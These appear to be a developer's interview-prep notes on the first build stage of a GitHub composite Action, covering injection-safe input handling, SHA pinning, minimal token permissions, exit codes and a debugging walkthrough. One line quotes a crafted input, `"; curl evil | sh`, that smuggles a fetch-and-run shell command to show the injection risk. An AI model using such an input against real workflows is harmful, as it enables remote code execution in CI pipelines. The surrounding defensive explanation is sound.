# Interview notes

One section per build stage. Each has five likely questions, a failure I have
actually reasoned through, and the commit that introduced it.

## Stage 1 - Skeleton

### Five questions

**1. Why a composite action instead of a JavaScript or Docker action?**
Composite is just YAML steps, so there is no build step or image to publish and
anyone can read exactly what runs. Docker actions are slower (image pull) and
Linux-only; JS actions need a committed, bundled `dist/`. The cost: composite
steps get no automatic `INPUT_*` variables and no `permissions:` block of their
own, so I map inputs to env vars explicitly and the *caller's* workflow sets
permissions.

**2. Why pass inputs through `env:` instead of writing `${{ inputs.x }}` in `run:`?**
`${{ }}` is expanded by the runner *before* bash sees the script, so a crafted
input like `"; curl evil | sh` becomes part of the code. Via `env:` the value
stays data in an environment variable. A test fails if `${{` appears in a
`run:` block.

**3. Why pin Actions to a full commit SHA?**
Tags and branches are mutable: if an upstream maintainer account is
compromised, `@v4` can be repointed at malicious code that runs with your
token. A SHA is content-addressed. I keep the tag in a trailing comment for
humans, and a test enforces SHA pins for every `uses:`.

**4. Why does a missing API key mean "rules-only" instead of an error?**
The AI layer is optional, and fork PRs never receive secrets, so "no key" is a
normal state, not a misconfiguration. Failing would make the Action unusable on
every fork PR. Rules-only is also the safe fallback for cost and data privacy.

**5. Why `contents: read` + `pull-requests: write` only?**
Least privilege: if the Action or a dependency is compromised, the token can
read code and write PR reviews, but cannot push, alter workflows, or touch
releases. A repo test fails if a workflow asks for more.

### One common failure and how I'd debug it

**Symptom:** the step fails with `::error title=Invalid pr-guardian input::...`
and exit code 2.
**Debug:** exit 2 is reserved for *configuration* errors (findings will use a
different code), so it is never a bug in the PR under review. Read the
annotation: all problems are listed at once. Typical causes: `fail-on: High `
with a typo, `dry-run: yes` (must be `true`/`false`), or `max-files: 0`. Check
the `with:` block of the calling workflow. If the message is empty, run locally:
`PRG_GITHUB_TOKEN=x PYTHONPATH=src python -m pr_guardian`.

### Decisions worth remembering

- **Default model is `claude-sonnet-5-5`**, not Haiku 4.5: Anthropic's models
  page (checked 2026-10-03) lists Haiku 4.5 retiring no sooner than 2026-10-15.
- **Zero runtime dependencies** so far: nothing to `pip install` at action run
  time, so a smaller supply-chain surface. PyYAML arrives in Stage 3 (pinned).
- **Exit codes:** 0 ok, 2 config error; 1 (findings fail the check) is added in Stage 4.

### Suggested commit

```
feat: project skeleton with composite action, config validation and CI

Add the composite action (inputs mapped to env vars), a validated frozen
Config, ruff/pytest/pre-commit tooling with pinned versions and SHA-pinned
Actions, repo-policy tests (SHA pins, no pull_request_target, minimal
permissions) and CI including an action smoke test.
```
